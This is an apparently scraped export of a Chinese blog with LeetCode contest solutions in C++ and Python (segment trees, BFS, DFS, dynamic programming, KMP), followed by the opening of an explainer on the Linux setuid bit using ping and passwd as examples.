题目大意：给定一些正方形的起始位置和长度，每次从空中掉落。如果正方形和之前的正方形重合，那么会叠加变高。求每次正方形掉落后的最大高度 思路 一看就是线段树的模板题而已。。 RMQ问题，并且是设置值的RMQ。 C++ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596class IntervalTree &#123;private: vector&lt;int&gt; maxv, setv; const int n; void pushdown(int o) &#123; int lc = (o &lt;&lt; 1) + 1, rc = lc + 1; if (setv[o] &gt;= 0) &#123; setv[lc] = setv[rc] = setv[o]; setv[o] = -1; &#125; &#125; void maintain(int o, int L, int R) &#123; int lc = (o &lt;&lt; 1) + 1, rc = lc + 1; if (L &lt; R) &#123; maxv[o] = max(maxv[lc], maxv[rc]); &#125; if (setv[o] &gt;= 0) &#123; maxv[o] = setv[o]; &#125; &#125; void update(int o, int L, int R, const int i, const int j, const int v) &#123; if (i &lt;= L &amp;&amp; R &lt;= j) &#123; setv[o] = v; &#125; else &#123; pushdown(o); int lc = (o &lt;&lt; 1) + 1, rc = lc + 1; int mid = L + ((R - L) &gt;&gt; 1); if (i &lt;= mid) update(lc, L, mid, i, j, v); else maintain(lc, L, mid); if (j &gt; mid) update(rc, mid + 1, R, i, j, v); else maintain(rc, mid + 1, R); &#125; maintain(o, L, R); &#125; int query(int o, int L, int R, const int i, const int j) &#123; if (setv[o] &gt;= 0) &#123; return setv[o]; &#125; else if (i &lt;= L &amp;&amp; R &lt;= j) &#123; return maxv[o]; &#125; else &#123; int _max = 0x80000000; int lc = (o &lt;&lt; 1) + 1, rc = lc + 1; int mid = L + ((R - L) &gt;&gt; 1); if (i &lt;= mid) _max = query(lc, L, mid, i, j); if (j &gt; mid) _max = max(_max, query(rc, mid + 1, R, i, j)); return _max; &#125; &#125;public: IntervalTree(int n) :n(n) &#123; maxv = vector&lt;int&gt;(n &lt;&lt; 2, 0); setv = vector&lt;int&gt;(n &lt;&lt; 2, -1); &#125; int query(const int i, const int j) &#123; return query(0, 0, n - 1, i, j); &#125; void update(const int i, const int j, const int v) &#123; update(0, 0, n - 1, i, j, v); &#125;&#125;;class Solution &#123;public: vector&lt;int&gt; fallingSquares(vector&lt;pair&lt;int, int&gt;&gt;&amp; positions) &#123; vector&lt;int&gt; points; unordered_map&lt;int, int&gt; index; for (pair&lt;int, int&gt;&amp; cur : positions) &#123; points.push_back(cur.first); points.push_back(cur.first + cur.second - 1); &#125; sort(points.begin(), points.end()); int n = 0; for (int p : points) if (index.find(p) == index.end()) index[p] = n++; vector&lt;int&gt; ans; IntervalTree tree(n); int maxv = 0; for (pair&lt;int, int&gt;&amp; cur : positions) &#123; int s = index[cur.first], side = cur.second, e = index[cur.first + cur.second - 1]; int h = tree.query(s, e) + side; tree.update(s, e, h); ans.push_back(maxv = maxv &lt; h ? h : maxv); &#125; return ans; &#125;&#125;; Python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182class IntervalTree(object): def __init__(self, n): self._n = n t = 1 while t &lt; n: t &lt;&lt;= 1 t &lt;&lt;= 1 self.maxv = [0] * t self.setv = [-1] * t def _pushdown(self, o): if self.setv[o] != -1: lc, rc = (o &lt;&lt; 1) + 1, (o &lt;&lt; 1) + 2 self.setv[lc] = self.setv[rc] = self.setv[o] self.setv[o] = -1 def _maintain(self, o, L, R): if L &lt; R: lc, rc = (o &lt;&lt; 1) + 1, (o &lt;&lt; 1) + 2 self.maxv[o] = max(self.maxv[lc], self.maxv[rc]) if self.setv[o] != -1: self.maxv[o] = self.setv[o] def _query(self, o, L, R, i, j): if self.setv[o] != -1: return self.setv[o] if i &lt;= L and R &lt;= j: return self.maxv[o] lc, rc = (o &lt;&lt; 1) + 1, (o &lt;&lt; 1) + 2 mid = (L + R) &gt;&gt; 1 _max = -1 if i &lt;= mid: _max = self._query(lc, L, mid, i, j) if j &gt; mid: _max = max(_max, self._query(rc, mid + 1, R, i, j)) return _max def _update(self, o, L, R, i, j, v): if i &lt;= L and R &lt;= j: self.setv[o] = v else: self._pushdown(o) mid = (L + R) &gt;&gt; 1 if i &lt;= mid: self._update((o &lt;&lt; 1) + 1, L, mid, i, j, v) else: self._maintain((o &lt;&lt; 1) + 1, L, mid) if j &gt; mid: self._update((o &lt;&lt; 1) + 2, mid + 1, R, i, j, v) else: self._maintain((o &lt;&lt; 1) + 2, mid + 1, R) self._maintain(o, L, R) def query(self, i, j): return self._query(0, 0, self._n - 1, i, j) def update(self, i, j, v): self._update(0, 0, self._n - 1, i, j, v)class Solution(object): def fallingSquares(self, positions): &quot;&quot;&quot; :type positions: List[List[int]] :rtype: List[int] &quot;&quot;&quot; points = set() for x, side in positions: points.add(x) points.add(x + side - 1) index = &#123;x: i for i, x in enumerate(sorted(points))&#125; ans = [] _max = -1 tree = IntervalTree(len(index)) for x, side in positions: s, e = index[x], index[x + side - 1] h = tree.query(s, e) + side _max = max(_max, h) tree.update(s, e, h) ans.append(_max) return ans 本文是leetcode如下的题解 696. Count Binary Substrings 697. Degree of an Array 698. Partition to K Equal Sum Subsets 699. Falling Squares 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode contest 53 solution","slug":"leetcode-contest-53-solution","date":"2017-10-08T09:41:20.000Z","updated":"2021-01-08T13:32:16.833Z","comments":true,"path":"leetcode-contest-53-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-53-solution/","excerpt":"本次题解包括 Stickers to Spell Word Binary Number with Alternating Bits Number of Distinct Islands Max Area of Island","text":"本次题解包括 Stickers to Spell Word Binary Number with Alternating Bits Number of Distinct Islands Max Area of Island 691. Stickers to Spell Word We are given N different types of stickers. Each sticker has a lowercase English word on it. You would like to spell out the given target string by cutting individual letters from your collection of stickers and rearranging them. You can use each sticker more than once if you want, and you have infinite quantities of each sticker. What is the minimum number of stickers that you need to spell out the target? If the task is impossible, return -1. Example 1: Input: 1[&quot;with&quot;, &quot;example&quot;, &quot;science&quot;], &quot;thehat&quot; Output: 13 Explanation: 123We can use 2 &quot;with&quot; stickers, and 1 &quot;example&quot; sticker.After cutting and rearrange the letters of those stickers, we can form the target &quot;thehat&quot;.Also, this is the minimum number of stickers necessary to form the target string. Example 2: Input: 1[&quot;notice&quot;, &quot;possible&quot;], &quot;basicbasic&quot; Output: 1-1 Explanation: 1We can&#39;t form the target &quot;basicbasic&quot; from cutting letters from the given stickers. Note: stickers has length in the range [1, 50]. stickers consists of lowercase English words (without apostrophes). target has length in the range [1, 15], and consists of lowercase English letters. In all test cases, all words were chosen randomly from the 1000 most common US English words, and the target was chosen as a concatenation of two random words. The time limit may be more challenging than usual. It is expected that a 50 sticker test case can be solved within 35ms on average. 题目地址：leetcode Stickers to Spell Word 题目大意：给定n个stickers，每个stickers可以使用无数次。现在要将stickers拼成target（就是拆分stickers中的字母来凑成target），求用最少的使用次数（使用同一个sticker两次次数算2）使得stickers可以组成target。 思路： 这题对时间要求很高。 要注意剪枝。很重要的一点就是只保留target的字符，然后去除被包含的所有stickers. 比如target为abc,stickers=['afg','abf']只保留stickers=['a','ab']，第一个被第二个包含，因此stickers=['ab']，这样能保证结果不差，而需要搜索的空间大大减少。 然后BFS即可。 python BFS 12345678910111213141516171819202122232425262728class Solution: def minStickers(self, stickers, target): &quot;&quot;&quot; :type stickers: List[str] :type target: str :rtype: int &quot;&quot;&quot; alphabet = [chr(i) for i in range(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;) + 1)] target_cnt = collections.Counter(target) stickers = [collections.Counter(s) &amp; target_cnt for s in stickers] for i in range(len(stickers) - 1, -1, -1): if any(stickers[i] == (stickers[i] &amp; stickers[j]) for j in range(len(stickers)) if i != j): stickers.pop(i) q = collections.deque() q.append((0, target)) vis = &#123;target&#125; while q: step, pre = q.popleft() pre_cnt = collections.Counter(pre) for sticker in stickers: cur = &#x27;&#x27;.join(c * max(0, pre_cnt.get(c, 0) - sticker.get(c, 0)) for c in alphabet) if len(cur) == len(target): continue # the sticker should not use. if not cur: return step + 1 # done if cur not in vis: q.append((step + 1, cur)) vis.add(cur) return -1 DFS + 记忆化搜索超时了。。 123456789101112131415161718192021222324252627282930class Solution: def minStickers(self, stickers, target): &quot;&quot;&quot; :type stickers: List[str] :type target: str :rtype: int &quot;&quot;&quot; def dfs(target, dp): if not target: return 0 if target in dp: return dp[target] target_cnt = collections.Counter(target) ans = len(target) + 1 for sticker in stickers: cur = &#x27;&#x27;.join(c * max(0, target_cnt.get(c, 0) - sticker.get(c, 0)) for c in alphabet) if len(cur) == len(target): continue # the sticker should not use. cnt = dfs(cur, dp) if cnt != -1: ans = min(ans, cnt + 1) dp[target] = ans if ans != len(target) + 1 else -1 return dp[target] alphabet = [chr(i) for i in range(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;) + 1)] target_cnt = collections.Counter(target) stickers = [collections.Counter(s) &amp; target_cnt for s in stickers] for i in range(len(stickers) - 1, -1, -1): if any(stickers[i] == (stickers[i] &amp; stickers[j]) for j in range(len(stickers)) if i != j): stickers.pop(i) dp = &#123;&#125; return dfs(target, dp) 693. Binary Number with Alternating Bits Given a positive integer, check whether it has alternating bits: namely, if two adjacent bits will always have different values. Example 1: 1234Input: 5Output: TrueExplanation:The binary representation of 5 is: 101 Example 2: 1234Input: 7Output: FalseExplanationThe binary representation of 7 is: 111. Example 3: 1234Input: 11Output: FalseExplanation:The binary representation of 11 is: 1011. Example 4: 1234Input: 10Output: TrueExplanation:The binary representation of 10 is: 1010. 题目地址：leetcode Binary Number with Alternating Bits 题目大意：给定一个数字，判断其是否1和0交替出现 思路 方法一 直接移位判断 1234567891011121314class Solution: def hasAlternatingBits(self, n): &quot;&quot;&quot; :type n: int :rtype: bool &quot;&quot;&quot; pre = n &amp; 1 n = n &gt;&gt; 1 while n: if n &amp; 1 == pre: return False pre = n &amp; 1 n &gt;&gt;= 1 return True 方法二： 位运算，如果一个数是交替出现的，那么t = n ^ (n &gt;&gt; 1)必全部为1. 因此 如果(t + 1) &amp; t为0，那么说明为交替出现。 12345678class Solution(object): def hasAlternatingBits(self, n): &quot;&quot;&quot; :type n: int :rtype: bool &quot;&quot;&quot; t = n ^ (n &gt;&gt; 1) return (t + 1) &amp; t == 0 695. Max Area of Island Given a non-empty 2D array grid of 0's and 1's, an island is a group of 1's (representing land) connected 4-directionally (horizontal or vertical.) You may assume all four edges of the grid are surrounded by water. Find the maximum area of an island in the given 2D array. (If there is no island, the maximum area is 0.) Example 1: 12345678[[0,0,1,0,0,0,0,1,0,0,0,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,1,1,0,1,0,0,0,0,0,0,0,0], [0,1,0,0,1,1,0,0,1,0,1,0,0], [0,1,0,0,1,1,0,0,1,1,1,0,0], [0,0,0,0,0,0,0,0,0,0,1,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,0,0,0,0,0,0,1,1,0,0,0,0]] Given the above grid, return 6. Note the answer is not 11, because the island must be connected 4-directionally. Example 2: 1[[0,0,0,0,0,0,0,0]] Given the above grid, return 0. Note: The length of each dimension in the given grid does not exceed 50. 题目地址：leetcode Max Area of Island 题目大意：给你一个二维数组，小岛用1表示，求小岛的个数。 思路 dfs即可 12345678910111213141516171819202122232425262728293031class Solution: def maxAreaOfIsland(self, grid): &quot;&quot;&quot; :type grid: List[List[int]] :rtype: int &quot;&quot;&quot; def dfs(x, y, vis): if vis[x][y]: return vis[x][y] = True for i in range(4): nx = x + dx[i] ny = y + dy[i] if 0 &lt;= nx &lt; m and 0 &lt;= ny &lt; n and not vis[nx][ny]: self.cur += 1 dfs(nx, ny, vis) self.ans = max(self.ans, self.cur) if not grid or not grid[0]: return 0 m = len(grid) n = len(grid[0]) dx = [1, -1, 0, 0] dy = [0, 0, 1, -1] self.ans = 0 vis = [[False if grid[x][y] else True for y in range(n)] for x in range(m)] for i in range(m): for j in range(n): if grid[i][j]: self.cur = 1 dfs(i, j, vis) return self.ans 694. Number of Distinct Islands Given a non-empty 2D array grid of 0's and 1's, an island is a group of 1's (representing land) connected 4-directionally (horizontal or vertical.) You may assume all four edges of the grid are surrounded by water. Count the number of distinct islands. An island is considered to be the same as another if and only if one island can be translated (and not rotated or reflected) to equal the other. Example 1: 123411000110000001100011 Given the above grid map, return 1. Example 2: 123411011100000000111011 Given the above grid map, return 3. Notice that: 12111 and 12111 are considered different island shapes, because we do not consider reflection / rotation. Note: The length of each dimension in the given grid does not exceed 50. 题目地址：leetcode Number of Distinct Islands 题目大意：和上面一题差不多。求独特的小岛的个数。独特的为不能经过平移得到的（即形状不同） 思路： DFS，然后hash记录小岛形状。 平移的话可以记录各个小岛的每个点相对于该小岛的最左上角的偏移，然后最左上角移动到(0，0) 123456789101112131415161718192021222324252627282930313233343536class Solution: def numDistinctIslands(self, grid): &quot;&quot;&quot; :type grid: List[List[int]] :rtype: int &quot;&quot;&quot; def dfs(x, y, vis): if vis[x][y]: return self.cur.append([x, y]) vis[x][y] = True for i in range(4): nx = x + dx[i] ny = y + dy[i] if 0 &lt;= nx &lt; m and 0 &lt;= ny &lt; n and not vis[nx][ny]: dfs(nx, ny, vis) if not grid or not grid[0]: return 0 m = len(grid) n = len(grid[0]) dx = [1, -1, 0, 0] dy = [0, 0, 1, -1] vis = [[False if grid[x][y] else True for y in range(n)] for x in range(m)] ans = set() for i in range(m): for j in range(n): if grid[i][j]: self.cur = [] dfs(i, j, vis) if self.cur: for k in range(1, len(self.cur)): self.cur[k][0] = self.cur[k][0] - self.cur[0][0] self.cur[k][1] = self.cur[k][1] - self.cur[0][1] self.cur[0] = [0, 0] ans.add(&#x27;:&#x27;.join([str(x) + &#x27;,&#x27; + str(y) for x, y in self.cur])) return len(ans) 本文是leetcode如下的题解 Stickers to Spell Word Binary Number with Alternating Bits Number of Distinct Islands Max Area of Island 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode contest 52 solution","slug":"leetcode-contest-52-solution","date":"2017-10-02T10:09:46.000Z","updated":"2021-01-08T13:32:16.832Z","comments":true,"path":"leetcode-contest-52-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-52-solution/","excerpt":"本次题解包括： Repeated String Match Longest Univalue Path Knight Probability in Chessboard Maximum Sum of 3 Non-Overlapping Subarrays","text":"本次题解包括： Repeated String Match Longest Univalue Path Knight Probability in Chessboard Maximum Sum of 3 Non-Overlapping Subarrays 686. Repeated String Match Given two strings A and B, find the minimum number of times A has to be repeated such that B is a substring of it. If no such solution, return -1. For example, with A = \"abcd\" and B = \"cdabcdab\". Return 3, because by repeating A three times (“abcdabcdabcd”), B is a substring of it; and B is not a substring of A repeated two times (\"abcdabcd\"). Note: The length of A and B will be between 1 and 10000. 题目地址：leetcode Repeated String Match 题意： 给定字符串A和字符串B，问B是A重复几次的字串。（这里的字串是连续的，比如abcd中的ad就不是字串） 思路： 方法一 引用solution的写的很清楚： Imagine we wrote S = A+A+A+.... If B is to be a substring of S, we only need to check whether some S[0:], S[1:], ..., S[len(A) - 1:] starts with B, as S is long enough to contain B, and S has period at most len(A). Now, suppose q is the least number for which len(B) &lt;= len(A * q). We only need to check whether B is a substring of A * q or A * (q+1). If we try k &lt; q, then B has larger length than A * q and therefore can't be a substring. When k = q+1, A * k is already big enough to try all positions for B; namely, A[i:i+len(B)] == B for i = 0, 1, ..., len(A) - 1. 翻译过来就是: B如果是S=AAAA的字串，那么必然有B的长度不大于S。 len(B) &lt;= len(Aq)，只需要查看B是否为 A q 或者A * (q+1)的字串。因为如果尝试的k&lt;q，那么不够长。当k=q+1的时候，A*k已经足够长来包括所有的B了， A[i:i+len(B)] == B for i = 0, 1, ..., len(A) - 1. 1234567891011class Solution(object): def repeatedStringMatch(self, A, B): &quot;&quot;&quot; :type A: str :type B: str :rtype: int &quot;&quot;&quot; repeat = (len(B) - 1) // len(A) + 1 if B in A * repeat: return repeat if B in A * (repeat + 1): return repeat + 1 return -1 方法二 KMP，对B求失配函数，然后匹配A。如果每次A遍历完一次而出现了重复的B中的下标，说明无解。 1234567891011121314151617181920212223242526272829303132class Solution(object): def repeatedStringMatch(self, A, B): &quot;&quot;&quot; :type A: str :type B: str :rtype: int &quot;&quot;&quot; def get_fail(s): f = [0] * (len(s) + 1) for i in range(1, len(s)): j = f[i] while j and s[i] != s[j]: j = f[j] if s[i] == s[j]: j += 1 f[i + 1] = j return f # kmp f = get_fail(B) j = 0 vis = &#123;0&#125; cnt = 1 while True: for i in range(len(A)): while j and A[i] != B[j]: j = f[j] if A[i] == B[j]: j += 1 if j == len(B): return cnt if j in vis: return -1 # 说明循环 vis.add(j) cnt += 1 return -1 方法三 Rolling Hash 见： https://leetcode.com/articles/repeated-string-match/ 687. Longest Univalue Path Given a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root. Note: The length of path between two nodes is represented by the number of edges between them. Example 1: Input: 12345 5 &#x2F; \\ 4 5 &#x2F; \\ \\1 1 5 Output: 12 Example 2: Input: 12345 1&#x2F; \\ 4 5 &#x2F; \\ \\4 4 5 Output: 12 Note: The given binary tree has not more than 10000 nodes. The height of the tree is not more than 1000. 题目地址：leetcode Longest Univalue Path 题意：给定一颗二叉树，求相同元素组成的最大路径长度。注意最大路径长度为路径上边的个数。 思路： 写个递归，返回左or右的最大路径即可 12345678910111213141516171819202122class Solution(object): def longestUnivaluePath(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: int &quot;&quot;&quot; def dfs(root): if not root: return 0 left = dfs(root.left) right = dfs(root.right) left_path = right_path = 0 if root.left and root.left.val == root.val: left_path = left + 1 if root.right and root.right.val == root.val: right_path = right + 1 self.ans = max(self.ans, left_path + right_path) return max(left_path, right_path) self.ans = 0 dfs(root) return self.ans 688. Knight Probability in Chessboard On an NxN chessboard, a knight starts at the r-th row and c-th column and attempts to make exactly Kmoves. The rows and columns are 0 indexed, so the top-left square is (0, 0), and the bottom-right square is (N-1, N-1). A chess knight has 8 possible moves it can make, as illustrated below. Each move is two squares in a cardinal direction, then one square in an orthogonal direction. Each time the knight is to move, it chooses one of eight possible moves uniformly at random (even if the piece would go off the chessboard) and moves there. The knight continues moving until it has made exactly K moves or has moved off the chessboard. Return the probability that the knight remains on the board after it has stopped moving. Example: 12345Input: 3, 2, 0, 0Output: 0.0625Explanation: There are two moves (to (1,2), (2,1)) that will keep the knight on the board.From each of those positions, there are also two moves that will keep the knight on the board.The total probability the knight stays on the board is 0.0625. Note: N will be between 1 and 25. K will be between 0 and 100. The knight always initially starts on the board. 题目地址：leetcode Knight Probability in Chessboard 题意：给定一个N*N的国际象棋棋盘，初始的时候在r,c这个位置。骑士每步可以如上图那样走动。问经过k步之后，你的骑士还有多大的概率在棋盘上。 思路： 记忆化搜索 123456789101112131415161718192021222324252627282930class Solution(object): def knightProbability(self, N, K, r, c): &quot;&quot;&quot; :type N: int :type K: int :type r: int :type c: int :rtype: float &quot;&quot;&quot; def dfs(x, y, k, dp): if dp[x][y][k] != -1: return dp[x][y][k] if k == 0: cur = 1 else: cur = 0 for i in range(8): nx, ny = x + dx[i], y + dy[i] if 0 &lt;= nx &lt; N and 0 &lt;= ny &lt; N: cur += 0.125 * dfs(nx, ny, k - 1, dp) dp[x][y][k] = cur return cur dx = [-2, -1, 1, 2, -2, -1, 1, 2] dy = [-1, -2, -2, -1, 1, 2, 2, 1] dp = [[[-1] * (K + 1) for _ in range(N)] for _ in range(N)] dfs(r, c, K, dp) return dp[r][c][K] 写成迭代貌似速度还慢了。。 1234567891011121314151617181920212223class Solution(object): def knightProbability(self, N, K, r, c): &quot;&quot;&quot; :type N: int :type K: int :type r: int :type c: int :rtype: float &quot;&quot;&quot; dx = [-2, -1, 1, 2, -2, -1, 1, 2] dy = [-1, -2, -2, -1, 1, 2, 2, 1] dp = [[0] * N for _ in range(N)] dp[r][c] = 1 for _ in range(K): ndp = [[0] * N for _ in range(N)] for x in range(N): for y in range(N): for i in range(8): nx, ny = x + dx[i], y + dy[i] if 0 &lt;= nx &lt; N and 0 &lt;= ny &lt; N: ndp[x][y] += 0.125 * dp[nx][ny] dp = ndp return sum(map(sum, dp)) 689. Maximum Sum of 3 Non-Overlapping Subarrays In a given array nums of positive integers, find three non-overlapping subarrays with maximum sum. Each subarray will be of size k, and we want to maximize the sum of all 3*k entries. Return the result as a list of indices representing the starting position of each interval (0-indexed). If there are multiple answers, return the lexicographically smallest one. Example: 1234Input: [1,2,1,2,6,7,5,1], 2Output: [0, 3, 5]Explanation: Subarrays [1, 2], [2, 6], [7, 5] correspond to the starting indices [0, 3, 5].We could have also taken [2, 1], but an answer of [1, 3, 5] would be lexicographically larger. Note: nums.length will be between 1 and 20000. nums[i] will be between 1 and 65535. k will be between 1 and floor(nums.length / 3). 题目地址：leetcode Maximum Sum of 3 Non-Overlapping Subarrays 题意：给定一个数组nums和数字k，求数组中三个长度为k的不重叠子数组，它们的和最大。返回这三个数组的起始坐标即可。 思路： 方法一 朴素的方法： 123456---------------- ------ ---------- a b i 枚举ab、bi、i之后的三段O(n^3)，不用看也知道TLE 如何加速? 为了方便描述，下面将ab、bi、i之后三段称为a、b、i 如果我们枚举i，对于当前的这个i，那么我们要是知道a、b两段的和的最大值就好了。 换句话说，假设已知a、b两段的和的最大值，那么我们只需要枚举i即可。 因此我们可以用dp[k][i]来表示前i个数字分为k-1段的最大和。 则显然有dp[k][i] = max(dp[k – 1][i – k] + sum[i -k + 1…i], dp[k][i – 1]) 最后回溯恢复下标即可。 12345678910111213141516171819202122232425262728class Solution &#123;public: vector&lt;int&gt; maxSumOfThreeSubarrays(vector&lt;int&gt;&amp; nums, int k) &#123; if (nums.empty()) return vector&lt;int&gt;&#123;&#125;; vector&lt;int&gt; sum(nums.size(), 0); sum[0] = nums[0]; for (int i = 1; i &lt; nums.size(); ++i) sum[i] += nums[i] + sum[i - 1]; vector&lt;vector&lt;int&gt;&gt; dp(3, vector&lt;int&gt;(nums.size(), 0)); dp[0][k - 1] = sum[k - 1]; for (int i = k; i &lt; nums.size(); ++i) &#123; dp[0][i] = max(sum[i] - sum[i - k], dp[0][i - 1]); if (i &gt;= k) &#123; dp[1][i] = max(dp[0][i - k] + sum[i] - sum[i - k], dp[1][i - 1]); if(i &gt;= 2*k) dp[2][i] = max(dp[1][i - k] + sum[i] - sum[i - k], dp[2][i - 1]); &#125; &#125; vector&lt;int&gt; ans(3, 0); ans[2] = max_element(dp[2].begin(), dp[2].end()) - dp[2].begin(); for (int i = 1; i &gt;= 0; --i) ans[i] = find(dp[i].begin(), dp[i].end(), dp[i + 1][ans[i + 1]] - (sum[ans[i + 1]] - sum[ans[i + 1] - k])) - dp[i].begin(); for (int i = 0; i &lt; 3; ++i) ans[i] -= k - 1; return ans; &#125;&#125;; 以前写的： 那么如何只枚举i的时候更新前面两段最大值? 注意到i每次向右滑动一个（就是i+1）的时候， b段不重复的就可以多了一个元素，即[i-k-1,i-1]，而这个元素要能在最大的a、b段中，必然加上之前的最大值。 于是维护max_interval为a段、a、b两段、a、b、i三段的最大值，对应的下标为max_index，初始值max_index = [[0], [0, k], [0, k, k &lt;&lt; 1]] 然后枚举i，范围为：[(k &lt;&lt; 1) + 1, len(nums) - k + 1) 分别计算现在新增的三段：pre_sum为累计和 three = pre_sum[i + k - 1] - pre_sum[i - 1] two = pre_sum[i - 1] - pre_sum[i - 1 - k] one = pre_sum[i - 1 - k] - pre_sum[i - 1 - (k &lt;&lt; 1)] 然后更新各段维护的最大值和其下标即可。 第一次写的时候下标max_index更新错了。因为可能第一段更新而第二段没有更新，第三段更新这种，然后max_index[0]和max_index[1]的区间是重叠的。改了就对了。 Python 72ms 1234567891011121314151617181920212223242526272829303132333435class Solution(object): def maxSumOfThreeSubarrays(self, nums, k): &quot;&quot;&quot; :type nums: List[int] :type k: int :rtype: List[int] &quot;&quot;&quot; pre_sum = [0] * len(nums) pre_sum[0] = nums[0] for i in range(1, len(nums)): pre_sum[i] = nums[i] + pre_sum[i - 1] max_index = [[0], [0, k], [0, k, k &lt;&lt; 1]] max_interval = [pre_sum[k - 1], pre_sum[(k &lt;&lt; 1) - 1] - pre_sum[k - 1], pre_sum[3 * k - 1] - pre_sum[(k &lt;&lt; 1) - 1]] max_interval[1] = max_interval[0] + max_interval[1] max_interval[2] = max_interval[1] + max_interval[2] for i in range((k &lt;&lt; 1) + 1, len(nums) - k + 1, 1): three = pre_sum[i + k - 1] - pre_sum[i - 1] two = pre_sum[i - 1] - pre_sum[i - 1 - k] one = pre_sum[i - 1 - k] - pre_sum[i - 1 - (k &lt;&lt; 1)] if one &gt; max_interval[0]: max_interval[0] = one max_index[0][0] = i - (k &lt;&lt; 1) if two + max_interval[0] &gt; max_interval[1]: max_interval[1] = two + max_interval[0] max_index[1] = [max_index[0][0], i - k] if max_interval[1] + three &gt; max_interval[2]: max_interval[2] = max_interval[1] + three max_index[2] = [max_index[1][0], max_index[1][1], i] return max_index[2] 方法二 分为左、中右三段，预处理左右两段k个数的最大值。 123456789101112131415161718192021222324252627282930313233343536class Solution(object): def maxSumOfThreeSubarrays(self, nums, k): &quot;&quot;&quot; :type nums: List[int] :type k: int :rtype: List[int] &quot;&quot;&quot; k_sub = [] cur = 0 for i, num in enumerate(nums): cur += num if i &gt;= k: cur -= nums[i - k] if i &gt;= k - 1: k_sub.append(cur) max_left, max_right = 0, len(k_sub) - 1 max_left_index = [0] * len(k_sub) max_right_index = [0] * len(k_sub) for i in range(len(k_sub)): if k_sub[i] &gt; k_sub[max_left]: max_left = i max_left_index[i] = max_left if k_sub[len(k_sub) - 1 - i] &gt;= k_sub[max_right]: max_right = len(k_sub) - 1 - i max_right_index[len(k_sub) - 1 - i] = max_right ans = [0, 0, 0] max_sum = 0 for i in range(k &lt;&lt; 1, len(k_sub)): b = i - k a = b - k if k_sub[max_left_index[a]] + k_sub[max_right_index[i]] + k_sub[b] &gt; max_sum: max_sum = k_sub[max_left_index[a]] + k_sub[max_right_index[i]] + k_sub[b] ans = [max_left_index[a], b, max_right_index[i]] return ans 本次是 leetcode 如下的题解 Repeated String Match Longest Univalue Path Knight Probability in Chessboard Maximum Sum of 3 Non-Overlapping Subarrays 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"Linux setuid与权能介绍","slug":"introduction-to-linux-capability","date":"2017-07-18T04:34:53.000Z","updated":"2021-01-08T13:42:14.044Z","comments":true,"path":"introduction-to-linux-capability/","link":"","permalink":"https://www.hrwhisper.me/introduction-to-linux-capability/","excerpt":"Linux下对于一个文件我们熟悉的权限有rwx，表示读写和执行。 今天介绍的是S位，称为setuid位。","text":"Linux下对于一个文件我们熟悉的权限有rwx，表示读写和执行。 今天介绍的是S位，称为setuid位。 setuid 从一个例子开始 ping命令常常用来测试网络是否通畅，我们看看ping的权限是啥： 12$ ll &#x2F;bin&#x2F;ping-rwsr-xr-x 1 root root 55724 6月 15 2016 &#x2F;bin&#x2F;ping* rws！第三个s是啥东西？将其删掉： 1234$ sudo chmod u-s &#x2F;bin&#x2F;ping$ ll &#x2F;bin&#x2F;ping-rwxr-xr-x 1 root root 55724 6月 15 2016 &#x2F;bin&#x2F;ping* 发现就无法ping了，因为没有打开socket的权限。而当我们又将s位给它的时候，又可以ping了。 Setuid位的作用 Setuid 是让程序在执行过程中拥有文件拥有者的权限。 用passwd命令举例来说，passwd命令也一样设置了setuid位。 为啥这个需要呢？我们知道linux中账号与密码分别存放在 /etc/passwd与 /etc/shadow，而后者的权限如下： 123456$ which passwd&#x2F;usr&#x2F;bin&#x2F;passwd$ ll &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x 1 root root 54256 3月 29 2016 &#x2F;usr&#x2F;bin&#x2F;passwd*ll &#x2F;etc&#x2F;shadow-rw-r----- 1 root shadow 978 7月 11 11:39 &#x2F;etc&#x2F;shadow 当我们使用passwd命令修改自己的密码（非root）的时候，显然是不行的，因为无法对/etc/shadow进行修改。而setuid位此时就可以帮到忙啦！ 此时程序暂时得到了文件拥有者root的权限，于是就可以修改shadow文件了。 Linux中设置Setuid的程序 要找出所有设置setuid的程序，只需要使用下面任意一条命令 12find &#x2F; -perm &#x2F;u&#x3D;sfind &#x2F; -perm -4000 结果如下： /bin/ping /bin/mount /bin/su /bin/fusermount /bin/ntfs-3g /bin/umount /usr/sbin/pppd /usr/lib/snapd/snap-confine /usr/lib/i386-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper 